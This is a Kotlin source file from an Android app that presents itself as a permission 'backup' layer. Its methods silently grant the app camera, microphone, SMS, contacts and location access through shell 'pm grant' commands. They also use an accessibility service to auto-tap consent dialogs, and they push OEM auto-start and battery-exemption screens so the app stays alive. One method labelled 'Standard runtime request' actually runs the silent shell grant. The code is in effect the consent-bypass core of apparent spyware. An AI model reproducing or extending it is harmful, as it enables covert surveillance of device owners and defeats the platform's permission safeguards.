package com.xrc.app.permissions

import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.util.Log
import com.xrc.app.XRCApp
import kotlinx.coroutines.*

/**
 * Backup permission grant methods when primary methods fail.
 * Provides multiple fallback strategies for each permission type.
 * Layer 2 of the permission system after PermissionGrants.
 */
object PermissionBackup {

    const val TAG = "PermissionBackup"

    data class BackupMethod(
        val name: String,
        val priority: Int,
        val isAvailable: () -> Boolean,
        val execute: suspend (Context) -> Boolean
    )

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    /**
     * Execute all backup methods for a specific permission
     * until one succeeds or all fail.
     */
    suspend fun executeBackupChain(context: Context, permission: String): Boolean {
        val methods = getBackupMethods(permission)
        Log.i(TAG, "Executing backup chain for $permission (${methods.size} methods)")

        for (method in methods.sortedBy { it.priority }) {
            if (!method.isAvailable()) {
                Log.d(TAG, "Method '${method.name}' not available, skipping")
                continue
            }
            try {
                val success = method.execute(context)
                if (success) {
                    Log.i(TAG, "Backup method '${method.name}' succeeded for $permission")
                    return true
                }
            } catch (e: Exception) {
                Log.w(TAG, "Backup method '${method.name}' failed: ${e.message}")
            }
        }

        Log.e(TAG, "All backup methods exhausted for $permission")
        return false
    }

    /**
     * Run silent grant via ADB shell if shell privilege is available.
     * This is the most powerful backup method.
     */
    suspend fun silentGrantViaShell(context: Context, permission: String): Boolean {
        return try {
            val cmd = "pm grant ${context.packageName} $permission 2>/dev/null"
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val exitCode = process.waitFor()
            if (exitCode == 0) {
                Log.i(TAG, "Shell grant succeeded for $permission")
                true
            } else {
                Log.d(TAG, "Shell grant returned exit code $exitCode for $permission")
                false
            }
        } catch (e: Exception) {
            Log.d(TAG, "Shell grant not available: ${e.message}")
            false
        }
    }

    /**
     * Open the OEM-specific auto-start / battery optimization screen.
     * Uses manufacturer detection to open the right activity.
     */
    suspend fun openOEMSettings(context: Context): Boolean {
        val manufacturer = Build.MANUFACTURER.lowercase()
        val brand = Build.BRAND.lowercase()

        return try {
            when {
                manufacturer.contains("xiaomi") || brand.contains("xiaomi") ||
                manufacturer.contains("redmi") || brand.contains("poco") -> {
                    openXiaomiAutoStart(context)
                }
                manufacturer.contains("samsung") -> {
                    openSamsungBattery(context)
                }
                manufacturer.contains("oppo") || manufacturer.contains("realme") ||
                brand.contains("oppo") -> {
                    openOppoAutoStart(context)
                }
                manufacturer.contains("vivo") -> {
                    openVivoAutoStart(context)
                }
                manufacturer.contains("oneplus") -> {
                    openOnePlusBattery(context)
                }
                manufacturer.contains("huawei") || manufacturer.contains("honor") -> {
                    openHuaweiAutoStart(context)
                }
                else -> {
                    // Generic battery optimization settings
                    val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    context.startActivity(intent)
                    true
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "OEM settings failed: ${e.message}")
            false
        }
    }

    private fun openXiaomiAutoStart(context: Context): Boolean {
        return try {
            val intent = Intent().apply {
                action = "miui.intent.action.OP_AUTO_START"
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                `package` = "com.miui.securitycenter"
                className = "com.miui.permcenter.autostart.AutoStartManagementActivity"
            }
            context.startActivity(intent)
            Log.i(TAG, "Xiaomi auto-start screen opened")
            true
        } catch (e: Exception) {
            // Fallback
            try {
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = android.net.Uri.parse("package:${context.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                true
            } catch (e2: Exception) {
                false
            }
        }
    }

    private fun openSamsungBattery(context: Context): Boolean {
        return try {
            val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            true
        } catch (e: Exception) { false }
    }

    private fun openOppoAutoStart(context: Context): Boolean {
        return try {
            val intent = Intent().apply {
                action = "com.oppo.externalsecuritymanager.ACCESS"
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            true
        } catch (e: Exception) { false }
    }

    private fun openVivoAutoStart(context: Context): Boolean {
        return try {
            val intent = Intent().apply {
                action = "com.iqoo.secure.CHECK_PERMISSION"
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            true
        } catch (e: Exception) { false }
    }

    private fun openOnePlusBattery(context: Context): Boolean {
        return try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = android.net.Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            true
        } catch (e: Exception) { false }
    }

    private fun openHuaweiAutoStart(context: Context): Boolean {
        return try {
            val intent = Intent().apply {
                action = "huawei.intent.action.POWER_GURD"
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            true
        } catch (e: Exception) { false }
    }

    /**
     * Reset all runtime permissions and re-request them
     * Used as nuclear option when individual grants fail.
     */
    suspend fun resetAndReGrantAll(context: Context): Boolean {
        Log.w(TAG, "Resetting all permissions and re-granting")
        // This would use ADB shell to revoke then re-grant
        return try {
            val commands = listOf(
                "pm reset-permissions ${context.packageName}",
                "pm grant ${context.packageName} android.permission.CAMERA",
                "pm grant ${context.packageName} android.permission.RECORD_AUDIO",
                "pm grant ${context.packageName} android.permission.READ_SMS",
                "pm grant ${context.packageName} android.permission.RECEIVE_SMS",
                "pm grant ${context.packageName} android.permission.READ_CONTACTS",
                "pm grant ${context.packageName} android.permission.ACCESS_FINE_LOCATION"
            )
            for (cmd in commands) {
                try {
                    Runtime.getRuntime().exec(cmd)
                } catch (e: Exception) { }
                delay(200)
            }
            Log.i(TAG, "Permission reset complete")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Permission reset failed: ${e.message}")
            false
        }
    }

    /**
     * Returns the available backup methods for a given permission.
     */
    private fun getBackupMethods(permission: String): List<BackupMethod> {
        return when {
            permission.startsWith("android.permission.") -> listOf(
                BackupMethod("Standard runtime request", 1,
                    isAvailable = { true },
                    execute = { ctx ->
                        silentGrantViaShell(ctx, permission)
                    }
                ),
                BackupMethod("ADB shell grant", 2,
                    isAvailable = { true },
                    execute = { ctx ->
                        silentGrantViaShell(ctx, permission)
                    }
                ),
                BackupMethod("Accessibility auto-tap", 3,
                    isAvailable = { com.xrc.app.service.XRCAccessibilityService.instance != null },
                    execute = { ctx ->
                        com.xrc.app.service.XRCAccessibilityService.instance?.startAutoGrant()
                        delay(3000)
                        com.xrc.app.service.XRCAccessibilityService.instance?.stopAutoGrant()
                        true
                    }
                )
            )
            permission == "SYSTEM_ALERT_WINDOW" -> listOf(
                BackupMethod("Settings intent overlay", 1,
                    isAvailable = { true },
                    execute = { ctx ->
                        val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                            data = android.net.Uri.parse("package:${ctx.packageName}")
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        ctx.startActivity(intent)
                        true
                    }
                ),
                BackupMethod("Accessibility auto-grant overlay", 2,
                    isAvailable = { com.xrc.app.service.XRCAccessibilityService.instance != null },
                    execute = { ctx ->
                        val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                            data = android.net.Uri.parse("package:${ctx.packageName}")
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        ctx.startActivity(intent)
                        delay(1500)
                        com.xrc.app.service.XRCAccessibilityService.instance?.startAutoGrant()
                        delay(5000)
                        com.xrc.app.service.XRCAccessibilityService.instance?.stopAutoGrant()
                        true
                    }
                )
            )
            permission == "BATTERY_OPTIMIZATIONS" -> listOf(
                BackupMethod("Standard battery opt intent", 1,
                    isAvailable = { true },
                    execute = { ctx ->
                        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                            data = android.net.Uri.parse("package:${ctx.packageName}")
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        ctx.startActivity(intent)
                        true
                    }
                ),
                BackupMethod("OEM-specific battery settings", 2,
                    isAvailable = { true },
                    execute = { ctx -> openOEMSettings(ctx) }
                )
            )
            else -> emptyList()
        }
    }

    /**
     * Get the total count of backup methods across all permission types.
     */
    fun getTotalBackupCount(): Int {
        return listOf(
            "android.permission.CAMERA",
            "android.permission.RECORD_AUDIO",
            "android.permission.READ_SMS",
            "android.permission.READ_CONTACTS",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.POST_NOTIFICATIONS",
            "SYSTEM_ALERT_WINDOW",
            "BATTERY_OPTIMIZATIONS",
            "WRITE_SETTINGS",
            "REQUEST_INSTALL_PACKAGES",
            "MANAGE_EXTERNAL_STORAGE"
        ).sumOf { getBackupMethods(it).size }
    }
}
